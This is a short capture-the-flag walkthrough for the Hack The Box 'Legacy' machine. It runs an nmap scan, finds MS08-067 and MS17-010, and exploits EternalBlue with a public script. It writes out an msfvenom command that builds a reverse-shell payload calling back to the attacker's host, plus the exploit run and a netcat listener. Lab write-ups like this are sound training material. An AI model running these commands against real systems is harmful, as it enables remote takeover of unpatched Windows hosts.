Legacy without Metasploit:

![Legacy](https://user-images.githubusercontent.com/55708909/91388528-2e9b1100-e855-11ea-9e19-33536c5bab8e.png)

Starting with Nmap Scan :
Nmap -sC -sV -T4 -A -O -oA Legacy -p- 10.10.10.4

![Legacy_nmap](https://user-images.githubusercontent.com/55708909/91389091-3f985200-e856-11ea-84e5-cd4c6331d2bc.png)
 As you can see that there are two ports open :
 1-Port 139
 2-Port 445

Therefore we will enumerate these ports.


I tried using basic tools but nothing seems to work so i run a vulnerability scan using nmap

![Legacy_vuln](https://user-images.githubusercontent.com/55708909/91391388-46739480-e857-11ea-95d0-1d3943d45251.png)

Nmap found us two vulnerability which can be exploited. 

1-MS08-067


2-MS17-010 (Eternal Blue)

I will be exploiting eternal blue using custom exploits from this git repo 

git clone https://github.com/helviojunior/MS17-010.git

cd MS17-010

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

open a netcat session on port 4444

Run these command : python send_and_execute.py 10.10.10.4 shell.exe and you will get a reverse shell on port 4444

![Legacy_shell](https://user-images.githubusercontent.com/55708909/91396814-f39adc80-e858-11ea-8a21-c25fa68f1066.png)


Since it does not have whoami features therefore we will upload nc.exe from our machine to target machine and get it executed.

![Legacy_flag](https://user-images.githubusercontent.com/55708909/91399730-20042800-e85c-11ea-8a3d-167ca4516724.png)










